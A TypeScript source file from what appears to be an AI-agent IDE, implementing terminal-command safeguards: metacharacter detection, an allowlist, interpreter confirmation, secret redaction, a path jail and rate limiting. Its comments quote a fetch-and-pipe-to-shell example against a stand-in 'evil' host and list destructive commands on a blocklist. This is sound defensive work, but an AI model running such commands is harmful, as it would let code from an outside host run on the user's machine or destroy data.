/*---------------------------------------------------------------------------------------------
 *  Copyright (c) Microsoft Corporation. All rights reserved.
 *  Licensed under the MIT License. See License.txt in the project root for license information.
 *--------------------------------------------------------------------------------------------*/
// Copyright (c) 2025 Razisafir. All rights reserved.
// Kovix proprietary code. See LICENSE.txt for proprietary license terms.

import { createDecorator } from '../../../instantiation/common/instantiation.js';

export const ITerminalExecutor = createDecorator<ITerminalExecutor>('kovix.terminalExecutor');

/**
 * Result of a terminal command execution.
 */
export interface ITerminalExecResult {
        stdout: string;
        stderr: string;
        exitCode: number;
}

/**
 * SEC-3: Shell metacharacters that could chain commands when combined with
 * user-provided arguments. These are stripped/rejected from ARGUMENTS only
 * (not the command itself).
 */
export const SHELL_METACHAR_BLOCKLIST = [
        ';', '&&', '||', '|', '`', '$(', ')', '{', '}', '>>', '>', '<', '2>',
];

/**
 * SEC-3: Regex patterns for detecting shell metacharacters in arguments.
 *
 * SEC-7 (L1 fix): Previous regex had `\|`` which matched pipe-followed-by-
 * backtick, not backtick alone — a typo that left backticks inside arguments
 * unflagged. Split into a proper alternation that matches each metachar
 * independently: `;`, `&&`, `||`, `|`, backtick, `$(
 */
const SHELL_METACHAR_REGEX = /;|&&|\|\||\||`|\$\(|\{|}|\d*>|</;

/**
 * SEC-3 + SEC-7 (H4 fix): Default allowlist for restricted mode.
 * Only these commands are allowed when kovix.terminal.restrictedMode is true.
 *
 * SEC-7 (H4 fix): Removed interpreters (node, python, python3, npx, npm, yarn,
 * pnpm, pip, pip3, cargo, go, dotnet, java, javac, mvn, gradle, rustc, make,
 * cmake, gcc, g++, clang, tsc) from the default allowlist. Any interpreter in
 * the allowlist is a trivial bypass — `node -e "require('child_process').execSync('curl evil|sh')"`
 * passes `isCommandInAllowlist` because `node` is trusted, but the dangerous
 * code lives inside a quoted string literal the metachar detector can't see.
 * `npx -y some-malicious-pkg` is the same problem.
 *
 * Users who need interpreters can set `kovix.terminal.restrictedMode` to
 * false (which already exists) — but then they're outside the default-safety
 * posture and every command will pop a confirmation dialog (planned, see H4
 * main fix in the tool registry).
 *
 * Also removed `curl` and `wget` from the default allowlist — they can fetch
 * and pipe to shell. Users who need them can disable restricted mode.
 */
export const DEFAULT_COMMAND_ALLOWLIST: string[] = [
        // Read-only file/listing commands
        'ls', 'dir', 'cat', 'head', 'tail', 'grep', 'rg', 'find', 'wc',
        'echo', 'pwd', 'whoami', 'which', 'where', 'env', 'printenv',
        // File mutations that don't escape the workspace
        'mkdir', 'touch', 'cp', 'mv',
        // Text-processing
        'sed', 'awk', 'sort', 'uniq', 'diff', 'patch',
        // Read-only VCS
        'git',
        // Container runtimes (read-only by default; the user has chosen to install them)
        'docker', 'podman', 'kubectl',
        // Test runners (execute code, but only code the user wrote in the workspace)
        'jest', 'vitest', 'mocha', 'eslint', 'prettier',
];

/**
 * SEC-7 (H4 fix): Commands that can execute arbitrary code when given a
 * crafted argument. When restricted mode is OFF (user explicitly disabled it),
 * these still trigger an interactive confirmation dialog before execution.
 */
export const INTERPRETER_COMMANDS: ReadonlySet<string> = new Set([
        'node', 'python', 'python3', 'pip', 'pip3',
        'npx', 'npm', 'yarn', 'pnpm',
        'cargo', 'rustc', 'go', 'dotnet',
        'java', 'javac', 'mvn', 'gradle',
        'make', 'cmake', 'gcc', 'g++', 'clang',
        'tsc', 'sh', 'bash', 'zsh', 'fish',
        'curl', 'wget',  // can fetch-and-pipe
        'docker', 'podman', 'kubectl',  // can mount/run arbitrary images
]);

/**
 * SEC-7 (H4 fix): Check whether a command is an interpreter-style command
 * that should trigger an interactive confirmation dialog even when the user
 * has disabled restricted mode.
 */
export function isInterpreterCommand(command: string): boolean {
        const baseCommand = command.trim().split(/\s+/)[0];
        const commandName = baseCommand.split('/').pop() ?? baseCommand;
        return INTERPRETER_COMMANDS.has(commandName);
}

/**
 * SEC-3: Rate limit configuration for terminal commands.
 * Max 10 terminal commands per 30 seconds per agent session.
 */
export const TERMINAL_RATE_LIMIT = {
        maxCommands: 10,
        windowMs: 30_000,
};

/**
 * SEC-3 + SEC-7 (L3 fix): Secret patterns that must NEVER appear in audit logs.
 *
 * SEC-7 (L3 fix): Expanded to cover the provider keys Kovix actually uses
 * (NVIDIA NIM `nvapi-`, OpenRouter `sk-or-`, Groq `gsk_`, GitHub PATs `ghp_`/`gho_`,
 * GitLab PATs `glpat-`), generic env-var names that almost always carry secrets
 * (KEY=, SECRET=, TOKEN=, PASSWORD=, CREDENTIAL=, PASS=, PWD=),
 * `Authorization: Basic <b64>` headers, and long hex strings (32+ chars) that
 * are typically API tokens (Together AI, Mistral, etc.).
 */
const SECRET_LOG_PATTERNS = [
        // Provider-specific key prefixes
        /sk-ant-[A-Za-z0-9_-]{20,}/g,        // Anthropic
        /sk-[A-Za-z0-9]{20,}/g,              // OpenAI (catches sk-or- too)
        /nvapi-[A-Za-z0-9_-]{20,}/g,         // NVIDIA NIM
        /gsk_[A-Za-z0-9]{20,}/g,             // Groq
        /ghp_[A-Za-z0-9]{20,}/g,             // GitHub PAT (classic)
        /gho_[A-Za-z0-9]{20,}/g,             // GitHub OAuth token
        /ghs_[A-Za-z0-9]{20,}/g,             // GitHub server-to-server
        /glpat-[A-Za-z0-9_-]{20,}/g,         // GitLab PAT
        /xox[bpoa]-[A-Za-z0-9-]{10,}/g,      // Slack tokens
        // Bearer / Authorization headers
        /Bearer\s+[A-Za-z0-9_.-]{20,}/g,
        /Authorization:\s*Basic\s+[A-Za-z0-9+/=]{16,}/gi,
        // Generic env-var-style secrets
        /(?:password|passwd|pwd)=[^\s'"]+/gi,
        /(?:token|apikey|api_key|secret|credential|access_key|secret_key)=[^\s'"]+/gi,
        /(?:KEY|SECRET|TOKEN|PASSWORD|CREDENTIAL)=[^\s'"]+/g,  // UPPER_CASE env-style
        // Generic 32+ char hex/base64 strings that look like API tokens
        // (Together AI, Mistral, etc. use random hex)
        /\b[a-f0-9]{32,}\b/gi,
        /\b[A-Za-z0-9_-]{40,}\b/g,  // 40+ char tokens (GitHub fine-grained, etc.)
];

/**
 * SEC-3: Sanitise a command for audit logging — redact any secret patterns.
 */
export function sanitiseForAuditLog(text: string): string {
        let result = text;
        for (const pattern of SECRET_LOG_PATTERNS) {
                result = result.replace(pattern, '[REDACTED]');
        }
        return result;
}

/**
 * SEC-3: Check if a command's arguments contain shell metacharacters.
 * Returns the matched character if found, or null if clean.
 */
export function detectShellMetacharInArgs(args: string): string | null {
        const match = args.match(SHELL_METACHAR_REGEX);
        return match ? match[0] : null;
}

/**
 * SEC-3 + SEC-7 (H4 fix): Check if a command is in the allowlist (for restricted mode).
 *
 * SEC-7 (H4 fix): Previous code used `commandName.startsWith(allowed)` which
 * is a separate bug — `curl-evil` matches `curl`, `npx-foo` matches `npx`, etc.
 * Replaced with strict equality. The `baseCommand.split('/').pop()` step still
 * correctly handles path-prefixed commands like `/usr/bin/git` → `git`.
 */
export function isCommandInAllowlist(command: string, allowlist?: string[]): boolean {
        const list = allowlist ?? DEFAULT_COMMAND_ALLOWLIST;
        // Extract the base command (first token)
        const baseCommand = command.trim().split(/\s+/)[0];
        // Handle path-prefixed commands like /usr/bin/git
        const commandName = baseCommand.split('/').pop() ?? baseCommand;
        return list.some(allowed => commandName === allowed);
}

/**
 * SEC-3: Enforce workspace directory jail — prevent cd to paths outside workspace root.
 */
export async function isPathWithinWorkspace(filePath: string, workspaceRoot: string): Promise<boolean> {
        const path = await import('path');
        const resolved = path.resolve(filePath);
        const root = path.resolve(workspaceRoot);
        return resolved.startsWith(root + path.sep) || resolved === root;
}

/**
 * SEC-3: Rate limiter for terminal command execution.
 * Tracks command timestamps per session.
 */
export class TerminalRateLimiter {
        private commandTimestamps: number[] = [];

        /**
         * Check if a new command can be executed within the rate limit.
         * Returns true if the command is allowed, false if rate limited.
         */
        canExecute(): boolean {
                const now = Date.now();
                const windowStart = now - TERMINAL_RATE_LIMIT.windowMs;

                // Remove timestamps outside the window
                this.commandTimestamps = this.commandTimestamps.filter(ts => ts > windowStart);

                return this.commandTimestamps.length < TERMINAL_RATE_LIMIT.maxCommands;
        }

        /**
         * Record a command execution timestamp.
         */
        recordExecution(): void {
                this.commandTimestamps.push(Date.now());
        }

        /**
         * Get the number of remaining commands in the current window.
         */
        remainingCommands(): number {
                const now = Date.now();
                const windowStart = now - TERMINAL_RATE_LIMIT.windowMs;
                this.commandTimestamps = this.commandTimestamps.filter(ts => ts > windowStart);
                return Math.max(0, TERMINAL_RATE_LIMIT.maxCommands - this.commandTimestamps.length);
        }
}

/**
 * Service for executing terminal commands securely within Kovix IDE.
 * Uses Kovix IDE's terminal infrastructure for real process execution.
 * Enforces a security blocklist to prevent dangerous commands.
 *
 * SEC-3: Enhanced with:
 * - Shell metacharacter detection in arguments
 * - Allowlist mode for restricted sessions (WSL/Kali)
 * - Working directory jail
 * - Rate limiting (10 commands per 30 seconds)
 * - Audit logging with secret redaction
 */
export interface ITerminalExecutor {
        readonly _serviceBrand: undefined;

        /**
         * Execute a command and return the result.
         * The command runs in a real shell process via Kovix IDE's terminal infrastructure.
         *
         * SEC-3: Command is validated against:
         * - Shell metacharacter blocklist in arguments
         * - Restricted mode allowlist (if enabled)
         * - Working directory jail
         * - Rate limit (10 commands / 30 seconds)
         *
         * @param command The command to execute
         * @param cwd Working directory (defaults to workspace root)
         * @param timeout Timeout in milliseconds (default: 60000)
         * @param signal Optional AbortSignal for cancellation
         * @param onOutput Optional callback for streaming output chunks. Receives
         *   cleaned (ANSI-stripped) output data as it arrives, enabling real-time
         *   progress indicators for long-running commands like npm install.
         * @returns Result with stdout, stderr, and exit code
         * @throws Error if command is on the security blocklist
         */
        execute(
                command: string,
                cwd?: string,
                timeout?: number,
                signal?: AbortSignal,
                onOutput?: (data: string) => void
        ): Promise<ITerminalExecResult>;

        /**
         * Check if a command is on the security blocklist.
         * Blocklist includes: rm -rf /, sudo, curl|sh, wget|sh, mkfs, dd to /dev,
         * chmod 777 /, writing to /etc/, fork bombs.
         */
        isBlocked(command: string): boolean;

        /**
         * SEC-7 (H4 fix): Check if a command is an interpreter-style command
         * (node, python, npx, npm, curl, wget, docker, etc.) that can execute
         * arbitrary code via crafted arguments.
         *
         * When restricted mode is ON (default), interpreter commands are blocked
         * by the allowlist. When restricted mode is OFF (user explicitly disabled
         * it), the agent UI should call this method before executing and show an
         * interactive confirmation dialog if it returns true — mirroring the
         * diff-approval flow used for `edit_file`.
         *
         * Until the confirmation UI is wired up, callers can use this to log a
         * warning so interpreter invocations are at least auditable.
         */
        isInterpreterCommand(command: string): boolean;
}
